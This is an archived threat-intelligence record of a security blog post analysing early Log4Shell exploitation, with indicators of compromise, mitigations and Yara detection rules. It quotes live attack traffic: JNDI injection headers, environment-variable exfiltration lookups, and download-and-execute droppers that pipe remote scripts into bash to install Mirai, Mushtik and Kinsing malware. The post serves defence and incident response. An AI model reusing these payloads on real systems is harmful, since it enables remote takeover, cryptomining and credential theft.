{
    "id": "cdc50bf2-34d7-4ddd-81d2-7201cb7f8375",
    "created_at": "2023-01-12T15:02:44.745166Z",
    "updated_at": "2025-03-27T02:17:01.077074Z",
    "deleted_at": null,
    "sha1_hash": "2784d2af84d79bfbce690db9d3d366a7ef74ce9b",
    "title": "2021-12-13 - Analysis of Initial In The Wild Attacks Exploiting Log4Shell-Log4J-CVE-2021-44228",
    "authors": "",
    "file_creation_date": "2022-05-28T19:19:51Z",
    "file_modification_date": "2022-05-28T19:19:51Z",
    "file_size": 810671,
    "plain_text": "# Analysis of Initial In The Wild Attacks Exploiting Log4Shell/Log4J/CVE-2021-44228\n\n**[cadosecurity.com/analysis-of-initial-in-the-wild-attacks-exploiting-log4shell-log4j-cve-2021-44228/](https://www.cadosecurity.com/analysis-of-initial-in-the-wild-attacks-exploiting-log4shell-log4j-cve-2021-44228/)**\n\nBlog\n\nDecember 13, 2021\n\n**Introduction**\n\n\nDecember 13, 2021\n\n\nLog4J is an open-source logging platform running on Java and built-in to many web\nplatforms. Public reports of exploitation started on December 9th, followed by wider\nexploitation on December 10th onwards:\n\nNumber of scans per day for CVE-2021-44228 – data from BinaryEdge.io\n\nThe exploit allows remote code execution, and relies upon Log4J loading data from LDAP\nvia a JNDI (Java Naming and Directory Interface) interface.\n\nBelow we have outlined the attacks we have seen in the wild so far, as well as a forensic\ninvestigation of a server compromised in one of the attacks.\n\n**_We’ve released a playbook on how to respond to compromises in Docker &_**\n**_Kubernetes environments – you can_** **_[get a free copy here.](https://offers.cadosecurity.com/the-ultimate-guide-to-docker-and-kubernetes-incident-response)_**\n\n**Environment Variable Scanning**\n\n\n-----\n\nWe have started to see both attacks and security researchers exploit the ability to\nincorporate Environment Variables into outgoing JNDI requests. Unlike the Remote Code\nExecution vulnerabilities which require importing data over LDAP, the environment variable\nbased attacks can run on the latest versions of Java. The RCE itself requires an older\n[version of Java from 2018 or before.](https://twitter.com/hakivvi/status/1469497299382542339)\n\nWe can see in data from BinaryEdge the known bad IP address 47.75.82[.]85 sending the\nenvironment and potentially return:\n```\nGET / HTTP/1.1\\r\\nHost: 47.75.82.85:443\\r\\n\nUser-Agent: ${${env:ENV_NAME:-j}n${env:ENV_NAME:d}i${env:ENV_NAME:-:}${env:ENV_NAME:-l}d${env:ENV_NAME:a}p${env:ENV_NAME:-:}//45.146.164.160:8081/w}\n\\r\\nContent-Type: application/json\n\\r\\nAccept-Encoding: gzip\\r\\nConnection: close\\r\\n\\r\\n\n\n```\nThe IP addresses 96.234.173[.]145 and 154.21.28[.]76 are sending the Java_Version as a\nDNS request to interactsh[.]com, a service popular with security researchers:\n```\nGET / HTTP/1.1\n\\r\\nHost: 47.106.202.101:7401\n\\r\\nUser-Agent:\n${jndi:ldap://${env:JAVA_VERSION}.c6v09ky2vtc000092300gdpor3hyyyyyb.interactsh.com}\n\\r\\nAccept-Encoding: gzip, deflate\\r\\nAccept: */*\\r\\nConnection: keep-alive\n\\r\\nAuthorization:\n${jndi:ldap://${env:JAVA_VERSION}.c6v09ky2vtc000092300gdpor3hyyyyyb.interactsh.com}\n\\r\\nReferer:\n${jndi:ldap://${env:JAVA_VERSION}.c6v09ky2vtc000092300gdpor3hyyyyyb.interactsh.com}\\r\\\n\n```\n[Sophos have reported that they have also seen attackers stealing environment variables](https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/)\nsuch as AWS_SECRET_ACCESS_KEY. Which would enable an attacker to have the same\naccess to your AWS environment (.e.g. List and download files from S3 Storage) as the\nsystem they compromised.\n\n**Mirai Botnet Activity**\n\nA number of [botnets have been observed exploiting the vulnerability.](https://blog.netlab.360.com/threat-alert-log4j-vulnerability-has-been-adopted-by-two-linux-botnets/)\n\nStarting December 11th we saw traffic such as this from 45.137.21[.]9:\n```\nPOST / HTTP/1.1\\r\\n\nUser-Agent:\n${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNT\n\\r\\nHost: 89.188.76.250\n\\r\\nAccept:\ntext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n\\r\\nAccept-Language: en-US,en;q=0.5\n\\r\\nAccept-Encoding: gzip, deflate\n\\r\\nConnection: close\\r\\nUpgrade-Insecure-Requests: 1\\r\\n\\r\\n\n\n```\n\n-----\n\nThe Base64 decodes to:\n```\nwget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh\n\n```\nThe first stage payload is a shell script from http://62.210.130[.]250/lh.sh which then installs\nthe Mirai binary appropriate for the targeted system, e.g.\nhttp://62.210.130[.]250/web/admin/x86\n\n[As usual with Mirai, is served from an open directory:](https://twitter.com/Meta_Explore/status/1469765115255959553)\n\n[The mirai samples then connect to the command and control server nazi[.]uy.](https://otx.alienvault.com/indicator/domain/nazi.uy)\n\n**Mushtik Activity**\n\nStarting December 11th, we started to see [activity from a number of IP ranges sending traffic](https://twitter.com/zom3y3/status/1469508032887414784)\nsuch as this:\n\n\n-----\n\n```\nGET /$%7Bjndi:ldap://45.130.229.168:1389/Exploit%7D HTTP/1.1\n\\r\\nHost: 89.188.76.250\n\\r\\nUser-Agent: Mozilla/5.0 zgrab/0.x\n\\r\\nAccept: */*\n\\r\\nAccept-Encoding: gzip\\r\\n\\r\\n\n\n```\nThis serves [Java Bytecode](https://www.virustotal.com/gui/url/a7eec86eedb760fb3259922bb954d032dd45ad0251fe468aebe1a7121671a71b)\n(4d040caffa28e6a0fdc0d274547cf1c7983996fc33e51b0b2c511544f030d71b)\n\nRunning strings over the file Exploit:\n```\nSourceFileExploit.javajava/lang/String\n/bin/bash\ncurl http://18.228.7.109/.log/log | sh\njava/lang/Exceptionjava/lang/Object\n\n```\nIt is clear it executes the shell script at http://18.228.7[.]109/.log/log :\n```\nwget -O /tmp/pty3 http://18.228.7.109/.log/pty3; chmod +x /tmp/pty3;\nchmod 700 /tmp/pty3; /tmp/pty3 &wget -O /tmp/pty4 http://18.228.7.109/.log/pty4;\nchmod +x /tmp/pty4; chmod 700 /tmp/pty4; /tmp/pty4 \n&wget -O /tmp/pty2 http://18.228.7.109/.log/pty2; chmod +x /tmp/pty2;\nchmod 700 /tmp/pty2; /tmp/pty2 &wget -O /tmp/pty1 http://18.228.7.109/.log/pty1;\nchmod +x /tmp/pty1; chmod 700 /tmp/pty1; /tmp/pty1 &wget -O /tmp/pty3\nhttp://18.228.7.109/.log/pty3; chmod +x /tmp/pty3; chmod 700 /tmp/pty3; /tmp/pty3\n&wget -O /tmp/pty5 http://18.228.7.109/.log/pty5; chmod +x /tmp/pty5; chmod 700\n/tmp/pty5; /tmp/pty5 &\n(curl http://159.89.182.117/wp-content/themes/twentyseventeen/ldm || wget -qO http://159.89.182.117/wp-content/themes/twentyseventeen/ldm)|bash\n\n```\nThese scripts then install Mushtik, a variant of the classic Tsunami Linux backdoor.\n\n**Responding to a Kinsing Compromise**\n\nWe set up a number of honeypots of outdated installations containing Log4J. After a few\nhours, we noticed that an old Apache Solr install was showing extremely high CPU\nutilization:\n\n\n-----\n\n[We acquired a full forensic copy of the system with Cado Response and commenced an](https://www.cadosecurity.com/platform/)\ninvestigation. It was immediately clear that a number of malicious files were present on the\nsystem – red dots here indicate folders where a file was detected as malware:\n\n\n-----\n\nMost miners drop a payload under /tmp and this is no exception – the crypto-currency\nminder xmrig is deployed at /tmp/kdevtmpfsi :\n\n\n-----\n\nAnd the kinsing malware itself was installed at /etc/kinsing :\n\nPivoting on the time around when /etc/kinsing was created, we saw see some references to\nscheduled tasks in the crontab:\n\n\n-----\n\n-----\n\nThe URL that is added to the crontab here has been down for some time:\n\n[We didn’t directly capture the initial exploitation, however we have seen delivery from Tor exit](https://twitter.com/ITSecurityguard/status/1469440865114406921)\nnodes with the following payload:\n```\nGET / HTTP/1.1\" 200 1121 \"-\"\n\"${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/(curl -s\n45.155.205.233:5874/$YOUR_IP:443||wget -q -O- 45.155.205.233:5874/$YOUR_IP:443)|bash}\n\n```\nThis Java object payload would then pull in and execute the installation script at\n[http://45.137.155[.]55/ex.sh – as recorded by Omri Segev Moyal.](https://twitter.com/GelosSnake/status/1469341429541576715)\n\n\n-----\n\n**Targeted Activity**\n\nA typical chain of events for exploits is:\n\nEarly exploitation from fast moving botnets such as Mushtik and Mirai; followed by\nTargeted use by mid-sophistication threat actors; followed by\nTargeted ransomware\n\nWe have not directly observed any targeted activity ourselves, however a CrowdStrike\nemployee reports that they have:\n\nMicrosoft [have said that they have “… observed activities including installing coin miners,](https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/)\nCobalt Strike to enable credential theft and lateral movement, and exfiltrating data from\ncompromised systems”\n\n**Recommendations and Mitigations**\n\nA number of mitigations can be employed to reduce the impact of Log4Shell:\n\nUpgrade Log4J to the latest version (>=2.15.0).\nUpgrade Java installations to 2019 or later editions.\nWhere that isn’t possible, you can manually set the setting\ncom.sun.jndi.rmi.object.trustURLCodebase to false.\nSetting either the system property log4j2.formatMsgNoLookups or the environment\nvariable LOG4J_FORMAT_MSG_NO_LOOKUPS to true.\nIf possible, block outgoing LDAP traffic.\n\nReview all vulnerable internet facing systems for signs of compromise. If any systems show\nsigns of compromise, we recommend that you investigate each system to determine what\nmalicious activity has occurred. This could include what data or accounts may have been\n\n\n-----\n\nexposed, if propagation to other systems had occurred, or if other unknown backdoors exist,\nand then determine if you need to take any further incident response actions. You may wish\nto forensically capture then reinstall and apply updates where feasible.\n\nFor systems that have been impacted in AWS, we also recommend that you monitor\nconnections to the AWS console for newly deployed ec2 instances, access to existing ec2\ninstances or S3 buckets using potentially compromised AWS credentials.\n\n**_We’ve released a playbook on how to respond to compromises in Docker &_**\n**_Kubernetes environments – you can_** **_[get a free copy here.](https://offers.cadosecurity.com/the-ultimate-guide-to-docker-and-kubernetes-incident-response)_**\n\n**Indicators of Compromise**\n\nEnvironment Variable Scanning\n\n45.146.164[.]160\n\ninteractsh[.]com\n\nMirai\n\n45.137.21[.]9\n\nhttp://62.210.130[.]250/lh.sh\n\nhttp://62.210.130[.]250/web/admin/x86\n\nnazi[.]uy\n\nMushtik\n\n45.130.229[.]168\n\n18.228.7[.]109\n\n159.89.182[.]117\n\n4d040caffa28e6a0fdc0d274547cf1c7983996fc33e51b0b2c511544f030d71b\n\nKinsing\n\n45.155.205[.]233\n\nhttp://93.189.42[.]8/kinsing\n\nhttp://93.189.42[.]8/lh.sh\n\n**Yara Rules**\n\n\n-----\n\n```\nrule Linux_Kinsing_Malware {\n  meta:\n   description = \"Detects Kinsing Malware\"\n   author = \"[email protected]\"\n   date = \"2021-12-11\"\n   license = \"Apache License 2.0\"\n   hash1 = \"6e25ad03103a1a972b78c642bac09060fa79c460011dc5748cbb433cc459938b\"\n  strings:\n   $a1 = \"main.goKrongo\" ascii\n   $a2 = \"main.taskWithScanWorker\" ascii\n   $a3 = \"main.runTaskWithHttp\" ascii\n   $a5 = \"main.getMinerPid\" ascii\n   $a6 = \"main.sendResult\" ascii\n   $a7 = \"main.minerRunningCheck\" ascii\n  condition:\n   uint16(0) == 0x457f and 4 of them\n}\nrule Cryptomining_Malware_Xmrig {\n  meta:\n   description = \"Detects Xmrig Cryptominer\"\n   author = \"[email protected]\"\n   date = \"2021-12-11\"\n   license = \"Apache License 2.0\"\n  strings:\n   $ = \"password for mining server\" nocase wide ascii\n   $ = \"threads count to initialize RandomX dataset\" nocase wide ascii\n   $ = \"display this help and exit\" nocase wide ascii\n   $ = \"maximum CPU threads count (in percentage) hint for autoconfig\" nocase wide\nascii\n   $ = \"enable CUDA mining backend\" nocase wide ascii\n   $ = \"cryptonight\" nocase wide ascii\n  condition:\n   5 of them\n}\nrule Mining_Worm_August_2020 {\n  meta:\n   description = \"Detects Mining Worm\"\n   author = \"[email protected]\"\n   date = \"2020-08-16\"\n   license = \"Apache License 2.0\"\n   hash1 = \"3a377e5baf2c7095db1d7577339e4eb847ded2bfec1c176251e8b8b0b76d393f\"\n   hash2 = \"929c3017e6391b92b2fbce654cf7f8b0d3d222f96b5b20385059b584975a298b\"\n   hash3 = \"705a22f0266c382c846ee37b8cd544db1ff19980b8a627a4a4f01c1161a71cb0\"\n  strings:\n   $a = \"echo $LOCKFILE | base64 -d > $tmpxmrigfile\" wide ascii\n   $b = \"/root/.tmp/xmrig –config=/root/.tmp/\" wide ascii\n   $c = \"if [ -s /usr/bin/curl ]; then\" wide ascii\n   $d = \"echo ‘found: /root/.aws/credentials'\" wide ascii\n   $e = \"function KILLMININGSERVICES(){\" wide ascii\n\n```\n\n-----\n\n```\n   $g touch /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null wide ascii\n   $h = \"rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service\" wide ascii\n   $i = \"[email protected]/root/.ssh/id_ed25519.pub\" wide ascii\n  condition:\n   filesize < 500KB and any of them\n}\n\n```\n**References**\n\n**About Cado Security**\n\nCado Security provides the cloud investigation platform that empowers security teams to\nrespond to threats at cloud speed. By automating data capture and processing across cloud\nand container environments, Cado Response effortlessly delivers forensic-level detail and\nunprecedented context to simplify cloud investigation and response. Backed by Blossom\nCapital and Ten Eleven Ventures, Cado Security has offices in the United States and United\n[Kingdom. For more information, please visit https://www.cadosecurity.com/ or follow us on](https://www.cadosecurity.com/)\nTwitter [@cadosecurity.](https://twitter.com/CadoSecurity)\n\n[Prev Post](https://www.cadosecurity.com/how-to-add-forensics-to-your-siem-and-start-automating-investigations/) [Next Post](https://www.cadosecurity.com/analysis-of-novel-khonsari-ransomware-deployed-by-the-log4shell-vulnerability/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-13 - Analysis of Initial In The Wild Attacks Exploiting Log4Shell-Log4J-CVE-2021-44228.pdf"
    ],
    "report_names": [
        "2021-12-13 - Analysis of Initial In The Wild Attacks Exploiting Log4Shell-Log4J-CVE-2021-44228.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a6c351ea-01f1-4c9b-af75-cfbb3b269ed3",
            "created_at": "2023-01-06T13:46:39.390649Z",
            "updated_at": "2025-03-27T02:00:03.072899Z",
            "deleted_at": null,
            "main_name": "Kinsing",
            "aliases": [
                "Money Libra"
            ],
            "source_name": "MISPGALAXY:Kinsing",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535764,
    "ts_updated_at": 1743041821,
    "ts_creation_date": 1653765591,
    "ts_modification_date": 1653765591,
    "files": {
        "pdf": "https://archive.orkl.eu/2784d2af84d79bfbce690db9d3d366a7ef74ce9b.pdf",
        "text": "https://archive.orkl.eu/2784d2af84d79bfbce690db9d3d366a7ef74ce9b.txt",
        "img": "https://archive.orkl.eu/2784d2af84d79bfbce690db9d3d366a7ef74ce9b.jpg"
    }
}